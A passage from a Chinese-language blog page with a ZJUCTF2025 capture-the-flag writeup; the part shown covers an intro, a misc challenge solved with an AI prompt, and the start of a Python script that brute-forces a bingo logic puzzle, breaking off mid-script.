
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../ctf_notebook/">
      
      
      
        
      
      
      <link rel="icon" href="../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>ZJUCTF2025 - carry's blog</title>
      
    
    
      <link rel="stylesheet" href="../assets/stylesheets/main.618322db.min.css">
      
        
        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
      
    
    
    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#writeup" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href=".." title="carry&#39;s blog" class="md-header__button md-logo" aria-label="carry's blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            carry's blog
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              ZJUCTF2025
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href=".." title="carry&#39;s blog" class="md-nav__button md-logo" aria-label="carry's blog" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    carry's blog
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href=".." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    首页
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../note/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    学业笔记
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../new_star_writeup/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    new_star_ctf
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../ctf_notebook/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    CSA培训
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    
  
    ZJUCTF2025
  

    
  </span>
  
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    
  
    ZJUCTF2025
  

    
  </span>
  
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      
        misc
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#lab-report" class="md-nav__link">
    <span class="md-ellipsis">
      
        lab report
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bingo" class="md-nav__link">
    <span class="md-ellipsis">
      
        bingo
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jgs" class="md-nav__link">
    <span class="md-ellipsis">
      
        JGS
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto" class="md-nav__link">
    <span class="md-ellipsis">
      
        crypto
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="crypto">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#crypt-it" class="md-nav__link">
    <span class="md-ellipsis">
      
        crypt-it
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#prng-study-plus-1" class="md-nav__link">
    <span class="md-ellipsis">
      
        prng study plus 1
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      
        web
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        一觉醒来全世界计算能力下降一万倍
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    <span class="md-ellipsis">
      
        你说你不懂 Linux
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rev" class="md-nav__link">
    <span class="md-ellipsis">
      
        rev
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="rev">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hello-reverse" class="md-nav__link">
    <span class="md-ellipsis">
      
        hello-reverse
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hej" class="md-nav__link">
    <span class="md-ellipsis">
      
        hej
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn" class="md-nav__link">
    <span class="md-ellipsis">
      
        pwn
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="pwn">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#who_am_i" class="md-nav__link">
    <span class="md-ellipsis">
      
        who_am_i
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#revenge-of-who_am_i" class="md-nav__link">
    <span class="md-ellipsis">
      
        revenge of who_am_i
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sandbox-of-who_am_i" class="md-nav__link">
    <span class="md-ellipsis">
      
        sandbox of who_am_i
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2048" class="md-nav__link">
    <span class="md-ellipsis">
      
        2048
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#safe" class="md-nav__link">
    <span class="md-ellipsis">
      
        safe
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cs_master" class="md-nav__link">
    <span class="md-ellipsis">
      
        cs_master
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unlucky" class="md-nav__link">
    <span class="md-ellipsis">
      
        unlucky
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        结束的话
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#github" class="md-nav__link">
    <span class="md-ellipsis">
      
        github
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      
        友链
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#misc" class="md-nav__link">
    <span class="md-ellipsis">
      
        misc
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="misc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#lab-report" class="md-nav__link">
    <span class="md-ellipsis">
      
        lab report
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bingo" class="md-nav__link">
    <span class="md-ellipsis">
      
        bingo
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#jgs" class="md-nav__link">
    <span class="md-ellipsis">
      
        JGS
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#crypto" class="md-nav__link">
    <span class="md-ellipsis">
      
        crypto
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="crypto">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#crypt-it" class="md-nav__link">
    <span class="md-ellipsis">
      
        crypt-it
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#prng-study-plus-1" class="md-nav__link">
    <span class="md-ellipsis">
      
        prng study plus 1
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#web" class="md-nav__link">
    <span class="md-ellipsis">
      
        web
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="web">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    <span class="md-ellipsis">
      
        一觉醒来全世界计算能力下降一万倍
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux" class="md-nav__link">
    <span class="md-ellipsis">
      
        你说你不懂 Linux
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#rev" class="md-nav__link">
    <span class="md-ellipsis">
      
        rev
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="rev">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#hello-reverse" class="md-nav__link">
    <span class="md-ellipsis">
      
        hello-reverse
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#hej" class="md-nav__link">
    <span class="md-ellipsis">
      
        hej
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#pwn" class="md-nav__link">
    <span class="md-ellipsis">
      
        pwn
      
    </span>
  </a>
  
    <nav class="md-nav" aria-label="pwn">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#who_am_i" class="md-nav__link">
    <span class="md-ellipsis">
      
        who_am_i
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#revenge-of-who_am_i" class="md-nav__link">
    <span class="md-ellipsis">
      
        revenge of who_am_i
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#sandbox-of-who_am_i" class="md-nav__link">
    <span class="md-ellipsis">
      
        sandbox of who_am_i
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2048" class="md-nav__link">
    <span class="md-ellipsis">
      
        2048
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#safe" class="md-nav__link">
    <span class="md-ellipsis">
      
        safe
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cs_master" class="md-nav__link">
    <span class="md-ellipsis">
      
        cs_master
      
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#unlucky" class="md-nav__link">
    <span class="md-ellipsis">
      
        unlucky
      
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      
        结束的话
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#github" class="md-nav__link">
    <span class="md-ellipsis">
      
        github
      
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    <span class="md-ellipsis">
      
        友链
      
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="writeup">writeup<a class="headerlink" href="#writeup" title="Permanent link">&para;</a></h1>
<p><strong>说在前面</strong></p>
<p><img alt="score" src="../pic/score.png" /></p>
<p>校赛最难打的一集，68道题目，pwn也有13道，做不动了，就只做了pwn方向的一些题目，其他方向都是签到题，最后得到了个pwn方向第三，三个pwn一血一个pwn三血</p>
<h2 id="misc">misc<a class="headerlink" href="#misc" title="Permanent link">&para;</a></h2>
<h3 id="lab-report">lab report<a class="headerlink" href="#lab-report" title="Permanent link">&para;</a></h3>
<p>刚拿到以为是空白隐写，找了半天没找到，随后ctrl+A发现找不到空白，还找了半天，最后发现只要喂给AI给合适的提示词就可以秒<img alt="2" src="../pic/2.png" /></p>
<h3 id="bingo">bingo<a class="headerlink" href="#bingo" title="Permanent link">&para;</a></h3>
<p>挺好玩的，我手推的，推出来是正确答案是第四列，后续弄了个脚本爆破验证了一下，确实是对的，脚本如下
<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">math</span>
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1"># --- 辅助函数 ---</span>
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="k">def</span><span class="w"> </span><span class="nf">is_prime</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">n</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>        <span class="k">if</span> <span class="n">n</span> <span class="o">%</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>    <span class="k">return</span> <span class="kc">True</span>
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="k">def</span><span class="w"> </span><span class="nf">is_composite</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>    <span class="k">if</span> <span class="n">n</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span> <span class="k">return</span> <span class="kc">False</span>
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="k">return</span> <span class="ow">not</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a><span class="c1"># --- 核心验证逻辑 ---</span>
<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>
<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="k">class</span><span class="w"> </span><span class="nc">PuzzleVerifier</span><span class="p">:</span>
<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">conditions</span> <span class="o">=</span> <span class="p">[</span>
<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>            <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">cond_00</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_01</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_02</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_03</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_04</span><span class="p">],</span>
<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>            <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">cond_10</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_11</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_12</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_13</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_14</span><span class="p">],</span>
<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>            <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">cond_20</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_21</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_22</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_23</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_24</span><span class="p">],</span>
<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>            <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">cond_30</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_31</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_32</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_33</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_34</span><span class="p">],</span>
<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>            <span class="p">[</span><span class="bp">self</span><span class="o">.</span><span class="n">cond_40</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_41</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_42</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_43</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">cond_44</span><span class="p">],</span>
<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>        <span class="p">]</span>
<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>
<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>    <span class="c1"># --- 条件函数定义 (0-based 索引) ---</span>
<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>    <span class="c1"># 第 1 行</span>
<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_00</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">))</span>
<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_01</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">12</span>
<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_02</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">1</span><span class="p">])</span> <span class="o">&lt;=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">2</span><span class="p">])</span> <span class="ow">and</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">1</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">2</span><span class="p">])</span> <span class="o">%</span> <span class="mi">2</span>
<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>    <span class="k">def</span><span class="w"> </span><span class="nf">cond_03</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">a_s</span><span class="p">):</span> <span class="k">return</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="p">:])</span> <span class="o">&lt;</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">g</span><span class="p">[:,</span> <span class="mi">3</span><span class="p">])</span>
